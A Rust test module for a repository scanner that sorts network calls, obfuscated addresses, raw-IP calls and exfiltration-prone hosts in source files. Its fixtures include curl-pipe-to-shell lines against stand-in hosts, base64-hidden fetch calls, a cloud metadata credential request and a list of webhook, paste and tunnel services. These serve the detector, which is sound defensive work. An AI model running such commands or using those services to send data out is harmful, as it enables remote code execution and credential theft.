        let report = scan_text("install.sh", b"curl 1.1.1.1/x | sh\n");

        assert_eq!(subjects(&report, Kind::NetworkCall), ["1.1.1.1"]);
    }

    #[test]
    fn lists_calls_whose_address_cannot_be_seen() {
        for line in [
            r#"requests.get(decode(blob))"#,
            r#"curl evil.example/x | sh"#,
            r#"const r = await axios(target)"#,
        ] {
            let report = scan_text("a.js", line.as_bytes());

            assert_eq!(
                subjects(&report, Kind::CallWithoutAddress),
                [line],
                "input: {line}"
            );
        }
    }

    #[test]
    fn decoding_right_beside_a_call_counts_as_hiding_the_address() {
        for text in [
            r#"fetch(atob("aHR0cHM6Ly9ldmlsLmV4YW1wbGU="))"#,
            "axios.get(Buffer.from(x, 'base64').toString())",
            "requests.get(base64.b64decode(blob))",
            "const url = atob(x);\nfetch(url);",
            "const a = String.fromCharCode(104, 116);\n\nconst r = await axios(a);",
        ] {
            let report = scan_text("a.js", text.as_bytes());

            assert_eq!(report.listed(Kind::HidesConnection).len(), 1, "{text}");
            assert!(report.listed(Kind::CallWithoutAddress).is_empty(), "{text}");
        }
    }

    #[test]
    fn decoding_after_a_call_cannot_have_hidden_its_address() {
        let report = scan_text("a.sh", b"curl \"$URL\" -o out\nbase64 -d out\n");

        assert!(report.listed(Kind::HidesConnection).is_empty());
        assert_eq!(report.listed(Kind::CallWithoutAddress).len(), 1);
    }

    #[test]
    fn ci_config_and_container_builds_are_listed_but_do_not_count_as_hiding() {
        for path in [
            ".github/workflows/a.yml",
            "sub/.github/workflows/a.yml",
            ".gitlab-ci.yml",
            ".gitlab/duo/agent-config.yml",
            ".circleci/config.yml",
            "Jenkinsfile",
            "Dockerfile",
            "docker/app.dockerfile",
            "docker/Dockerfile.linux",
            ".azure-pipelines/scripts/a.sh",
            ".github/scripts/a.ps1",
        ] {
            assert_eq!(classify(path), FileClass::RunsElsewhere, "{path}");

            let report = scan_text(path, b"fetch(atob(x))\ncurl https://a.example/i\n");

            assert_eq!(report.listed(Kind::CallWithoutAddress).len(), 1, "{path}");
            assert_eq!(report.listed(Kind::NetworkCall).len(), 1, "{path}");
            assert!(report.listed(Kind::HidesConnection).is_empty(), "{path}");
        }
    }

    #[test]
    fn code_that_could_be_loaded_gets_full_checks_even_in_a_ci_folder() {
        for path in [".github/hook.js", ".gitlab/lib.py", ".azure-pipelines/a.ts"] {
            assert_eq!(classify(path), FileClass::Code, "{path}");
        }
    }

    #[test]
    fn only_really_reserved_names_count_as_reserved() {
        for host in [
            "example.com",
            "cdn.example.com",
            "a.example",
            "a.invalid",
            "a.test",
        ] {
            assert!(is_reserved_host(host), "{host}");
        }
        for host in [
            "evilexample.com",
            "example.com.evil.net",
            "notexample",
            "latest",
            "evil.net",
        ] {
            assert!(!is_reserved_host(host), "{host}");
        }
    }

    #[test]
    fn similar_names_do_not_count_as_ci_config() {
        for path in [
            "my.github/a.js",
            "src/github/a.js",
            "dockerfile.js",
            "gitlab.js",
        ] {
            assert_eq!(classify(path), FileClass::Code, "{path}");
        }
    }

    #[test]
    fn decoding_far_from_a_call_does_not_count() {
        let padding = "// filler\n".repeat(DECODE_NEARBY_LINES + 2);
        let text = format!("const a = atob(x);\n{padding}fetch(url);");
        let report = scan_text("a.js", text.as_bytes());

        assert!(report.listed(Kind::HidesConnection).is_empty());
        assert_eq!(report.listed(Kind::CallWithoutAddress).len(), 1);
    }

    #[test]
    fn a_call_to_a_host_built_at_run_time_is_one_airlock_cannot_see() {
        let url = "https://${HOST}/sync";
        let report = scan_text("a.js", format!("fetch(`{url}`)\n").as_bytes());

        assert_eq!(
            report.listed(Kind::CallWithoutAddress),
            [(url.to_string(), 1)]
        );
        assert!(report.listed(Kind::NetworkCall).is_empty());
    }

    #[test]
    fn remembers_which_files_make_network_calls() {
        let report = scan_text(
            "scripts/a.js",
            b"fetch('https://evil.example/x')\nfetch(hidden)\ncurl 1.1.1.1/x\n// https://b.example\n",
        );

        let calls = report.calls_in("scripts/a.js");
        let subjects: Vec<&str> = calls.iter().map(|call| call.subject.as_str()).collect();

        assert_eq!(
            subjects,
            ["https://evil.example/x", "1.1.1.1", "fetch(hidden)"]
        );
        assert_eq!(calls[0].group, "evil.example");
        assert_eq!(calls[0].line, Some(1));
    }

    #[test]
    fn nearby_lines_stops_at_the_line_and_byte_limits() {
        let text = b"one\ntwo\nthree\nfour\nfive\n";
        let start = 8;
        let end = 13;

        assert_eq!(nearby_lines(text, start, end, 1, 100), b"two\nthree\nfour");
        assert_eq!(nearby_lines(text, start, end, 0, 100), b"three");
        assert_eq!(nearby_lines(text, start, end, 9, 100), &text[..text.len()]);
    }

    #[test]
    fn nearby_lines_stays_narrow_in_minified_code() {
        let text = "x".repeat(5000);

        let window = nearby_lines(text.as_bytes(), 2500, 2501, 3, 400);

        assert_eq!(window.len(), NEARBY_BYTES * 2 + 1);
    }

    #[test]
    fn an_address_containing_a_call_word_is_not_a_call() {
        let report = scan_text(
            "a.js",
            b"// https://developer.mozilla.org/docs/Web/API/XMLHttpRequest/x\n",
        );

        assert!(report.listed(Kind::NetworkCall).is_empty());
        assert_eq!(report.listed(Kind::MentionedAddress).len(), 1);
    }

    #[test]
    fn prose_and_unrelated_methods_are_not_calls() {
        for line in [
            "# Downloads $1 over HTTPS with curl or wget.",
            "// Curl currently emits these fields",
            "// Handle --curl mode early",
            "$output->fetch()",
            ".fetch()?;",
        ] {
            let report = scan_text("a.rs", line.as_bytes());

            assert!(
                report.listed(Kind::CallWithoutAddress).is_empty(),
                "input: {line}"
            );
        }
    }

    #[test]
    fn command_line_calls_are_recognized_by_their_arguments() {
        for line in [
            "curl -fsSL \"$URL\" | sh",
            "curl \"$URL\"",
            "curl $URL",
            "curl evil.example/x",
            "curl localhost:8080/x",
            "wget -q $URL",
            "iwr $url",
        ] {
            let report = scan_text("a.sh", line.as_bytes());

            assert_eq!(
                report.listed(Kind::CallWithoutAddress).len(),
                1,
                "input: {line}"
            );
        }
    }

    #[test]
    fn a_plain_mention_is_not_called_a_network_call() {
        let report = scan_text("a.js", b"// see https://a.example/docs\n");

        assert!(report.listed(Kind::NetworkCall).is_empty());
        assert_eq!(report.listed(Kind::MentionedAddress).len(), 1);
    }

    #[test]
    fn a_call_far_away_on_a_long_minified_line_does_not_count() {
        let padding = "x".repeat(NEARBY_BYTES * 2);
        let text = format!("fetch(a);{padding}'https://a.example/x'");
        let report = scan_text("a.min.js", text.as_bytes());

        assert!(report.listed(Kind::NetworkCall).is_empty());
        assert_eq!(report.listed(Kind::MentionedAddress).len(), 1);
    }

    #[test]
    fn sorts_addresses_by_the_kind_of_file_they_are_in() {
        let url = b"https://a.example/x\n";

        for (path, kind) in [
            ("README.md", Kind::DocumentationAddress),
            ("docs/guide.rst", Kind::DocumentationAddress),
            ("LICENSE", Kind::DocumentationAddress),
            ("LICENSE-MIT", Kind::DocumentationAddress),
            ("Cargo.lock", Kind::LockfileAddress),
            ("web/package-lock.json", Kind::LockfileAddress),
            ("src/main.rs", Kind::MentionedAddress),
            ("package.json", Kind::MentionedAddress),
            ("requirements.txt", Kind::MentionedAddress),
            // These names must not make code look like documentation.
            ("license.js", Kind::MentionedAddress),
            ("changelog.py", Kind::MentionedAddress),
        ] {
            let report = scan_text(path, url);

            assert_eq!(report.listed(kind).len(), 1, "path: {path}");
        }
    }

    #[test]
    fn documentation_is_not_searched_for_calls_but_its_addresses_are_listed() {
        let report = scan_text("README.md", b"Run: curl -s https://a.example/i | sh\n");

        assert!(report.listed(Kind::CallWithoutAddress).is_empty());
        assert_eq!(report.listed(Kind::DocumentationAddress).len(), 1);
    }

    #[test]
    fn local_addresses_get_their_own_section() {
        for text in [
            "http://localhost:3000/x",
            "http://app.local/x",
            "http://127.0.0.1:8080/x",
            "10.0.0.5",
            "192.168.1.1",
            "http://[::1]:80/x",
            "0.0.0.0",
            "255.255.255.0",
            "192.0.2.10",
        ] {
            let report = scan_text("a.yml", format!("{text}\n").as_bytes());

            assert_eq!(report.listed(Kind::LocalAddress).len(), 1, "input: {text}");
        }
    }

    #[test]
    fn the_cloud_credentials_address_is_never_treated_as_merely_local() {
        let report = scan_text(
            "a.py",
            b"requests.get('http://169.254.169.254/latest/meta-data/')\n",
        );

        assert!(report.listed(Kind::LocalAddress).is_empty());
        assert_eq!(report.listed(Kind::NetworkCall).len(), 1);
    }

    #[test]
    fn lockfile_versions_are_not_listed_as_ip_addresses() {
        let report = scan_text(
            "Cargo.lock",
            b"version = \"1.2.3.4\"\nsource = \"https://evil.example/x\"\n",
        );

        assert!(report.listed(Kind::IpAddress).is_empty());
        assert!(report.listed(Kind::LocalAddress).is_empty());
        assert_eq!(report.listed(Kind::LockfileAddress).len(), 1);
    }

    #[test]
    fn reports_the_right_line_numbers() {
        let url = "https://a.example/x";
        let text = format!("one\ntwo\n{url}\nfour\n{url}\n");
        let report = scan_text("a.js", text.as_bytes());

        assert_eq!(report.first_line(Kind::MentionedAddress, url), Some(3));
        assert_eq!(
            report.listed(Kind::MentionedAddress),
            [(url.to_string(), 2)]
        );
    }

    #[test]
    fn finds_addresses_inside_binary_files_without_line_numbers() {
        let url = "https://evil.example/x";
        let mut contents = vec![0u8; 16];
        contents.extend_from_slice(url.as_bytes());
        contents.push(0);
        let report = scan_text("tool.bin", &contents);

        assert_eq!(subjects(&report, Kind::MentionedAddress), [url]);
        assert_eq!(report.first_line(Kind::MentionedAddress, url), None);
    }

    #[test]
    fn binary_files_are_not_searched_for_calls() {
        let report = scan_text("a.bin", b"\0\0fetch(x)\0");

        assert!(report.listed(Kind::CallWithoutAddress).is_empty());
    }

    #[test]
    fn a_call_to_an_unexplained_ip_address_is_dangerous() {
        for line in [
            "axios.get('http://95.164.17.24:1224/client/x')",
            "curl http://95.164.17.24/i.sh -o a",
            "requests.post('http://[2001:4860::1]/x')",
            "curl 95.164.17.24/x",
        ] {
            let report = scan_text("a.js", line.as_bytes());

            assert_eq!(report.listed(Kind::CallsRawIp).len(), 1, "{line}");
            assert!(report.has_calls("a.js"), "{line}");
        }
    }

    #[test]
    fn an_ip_address_alone_or_a_public_dns_service_is_not_called_dangerous() {
        for line in [
            "// see 95.164.17.24 for this",
            "const a = 'http://95.164.17.24/x';",
            "net.Dial(\"udp\", \"8.8.8.8:53\")",
            "curl 1.1.1.1/x",
            "fetch('http://127.0.0.1:3000/x')",
        ] {
            let report = scan_text("a.js", line.as_bytes());

            assert!(report.listed(Kind::CallsRawIp).is_empty(), "{line}");
        }
    }

    #[test]
    fn a_call_to_an_ip_address_in_ci_config_is_listed_but_not_dangerous() {
        let report = scan_text(".github/workflows/a.yml", b"curl http://95.164.17.24/x\n");

        assert!(report.listed(Kind::CallsRawIp).is_empty());
        assert_eq!(report.listed(Kind::NetworkCall).len(), 1);
    }

    #[test]
    fn lists_services_attackers_like_by_what_they_do() {
        for (url, service) in [
            ("https://api.npoint.io/abc", STORES_FILES),
            ("https://pastebin.com/raw/abc", STORES_FILES),
            ("https://webhook.site/abc", COLLECTS_DATA),
            ("https://abc.ngrok-free.app/x", TUNNELS),
            ("https://bit.ly/abc", SHORT_LINKS),
            ("https://api.ipify.org/", SHOWS_IP),
            ("https://discord.com/api/webhooks/1/abc", CHAT),
            ("https://api.telegram.org/bot123/sendMessage", CHAT),
            ("http://abcdefg.onion/x", TOR),
        ] {
            let report = scan_text("a.js", format!("x = '{url}'\n").as_bytes());

            assert_eq!(
                report.group_of(Kind::RiskyHost, url).as_deref(),
                Some(service),
                "{url}"
            );
        }
    }

    #[test]
    fn names_that_only_resemble_those_services_are_not_listed() {
        for url in [
            "https://notbit.ly/abc",
            "https://discord.com/invite/abc",
            "https://api.telegram.org/file/x",
            "https://pastebin.com.evil.net/x",
        ] {
            let report = scan_text("a.js", format!("x = '{url}'\n").as_bytes());

            assert!(report.listed(Kind::RiskyHost).is_empty(), "{url}");
        }
    }

    #[test]
    fn those_services_in_documentation_are_not_singled_out() {
        let report = scan_text("README.md", b"https://pastebin.com/abc\n");

        assert!(report.listed(Kind::RiskyHost).is_empty());
    }

    #[test]
    fn recognizes_test_files() {
        for path in [
            "test/a.js",
            "src/tests/a.py",
            "testdata/a.txt",
            "a/__tests__/b.js",
            "a_test.go",
            "a.test.ts",
            "a.spec.js",
            "test_a.py",
            "fixtures/a.js",
            "src/app.tests.integration/a.js",
        ] {
            assert!(is_test_path(path), "{path}");
        }
        for path in ["src/a.js", "contest/a.js", "latest.js", "attest/a.py"] {
            assert!(!is_test_path(path), "{path}");
        }
    }

    #[test]
    fn recognizes_comments() {
        for (path, text) in [
            ("a.js", "// curl x | sh"),
            ("a.js", "  /* curl x | sh"),
            ("a.sh", "# curl x | sh"),
            ("a.py", "    # curl x | sh"),
            ("a.bat", "REM curl x | sh"),
            ("a.bat", ":: curl x | sh"),
            ("a.html", "<!-- curl x | sh"),
        ] {
            let offset = text.find("curl").unwrap();

            assert!(
                is_in_comment(text.as_bytes(), offset, path),
                "{path}: {text}"
            );
        }
    }

    #[test]
    fn code_made_to_look_like_a_comment_still_counts() {
        for (path, text) in [
            ("a.sh", "curl x | sh # curl x | sh"),
            ("a.js", "/* a */ curl x | sh"),
            ("a.js", "#x = curl x | sh"),
            ("a.js", "// ${curl x | sh}"),
            ("a.html", "<!-- a --> curl x | sh"),
        ] {
            let offset = text.find("curl").unwrap();

            assert!(
                !is_in_comment(text.as_bytes(), offset, path),
                "{path}: {text}"
            );
        }
    }

    #[test]
    fn hostile_bytes_do_not_panic() {
        for contents in [
            &b"https://\xff\xfe"[..],
            b"https://\xff\xfe/x",
            b"https://@",
            b"https://:",
            b"https://[",
            b"https://[]",
            b"http://?",
            b"fetch(\xff\xfe",
            b"\xff.\xff.\xff.\xff",
            b"",
        ] {
            scan_text("a.js", contents);
        }
        let huge = format!("https://{}", "a".repeat(1024 * 1024));
        scan_text("a.js", huge.as_bytes());
    }
}
